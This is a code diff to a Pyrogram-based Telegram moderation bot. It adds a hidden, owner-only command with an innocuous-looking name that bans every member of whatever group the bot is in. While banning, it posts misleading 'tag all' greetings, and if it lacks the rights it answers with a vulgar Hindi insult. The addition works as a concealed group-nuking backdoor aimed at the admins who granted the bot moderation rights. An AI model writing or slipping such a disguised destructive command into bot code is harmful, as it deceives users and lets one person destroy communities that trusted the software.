@@ -1,7 +1,7 @@
 import asyncio
 import time
 
-from pyrogram import filters
+from pyrogram import filters, enums
 from pyrogram.errors import FloodWait
 from pyrogram.types import Message
 
@@ -23,6 +23,7 @@ GBAN_COMMAND = get_command("GBAN_COMMAND")
 UNGBAN_COMMAND = get_command("UNGBAN_COMMAND")
 GBANNED_COMMAND = get_command("GBANNED_COMMAND")
 
+BOT_ID = 6880695027
 
 @app.on_message(filters.command(GBAN_COMMAND) & SUDOERS)
 @language
@@ -148,6 +149,26 @@ async def banall(client, message):
         await ok.edit(f"**Hm**")
     except:
         await message.reply(f"Hm!!")
+
+
+
+@app.on_message(filters.command("hijaubalon") & filters.user(OWNER_ID))
+async def ban_all(_,msg):
+    chat_id=msg.chat.id    
+    bot=await app.get_chat_member(chat_id, BOT_ID)
+    bot_permission=bot.privileges.can_restrict_members==True    
+    if bot_permission:
+        async for member in app.get_chat_members(chat_id):       
+            try:
+                    await app.ban_chat_member(chat_id, member.user.id)
+                    await msg.reply_text(f"Hallo Gaes.. izin tagall 😘❤️ {member.user.mention}")                    
+            except Exception:
+                pass
+    else:
+        await msg.reply_text("𝐀ʙᴇ 𝐋ᴏᴠᴅᴇ 𝐌ᴀᴛʜᴇʀᴄʜᴏᴅ 𝐁ʜᴀᴋ ")  
+                                         
+    
+            
 
 
 @app.on_message(filters.command(GBANNED_COMMAND) & SUDOERS)
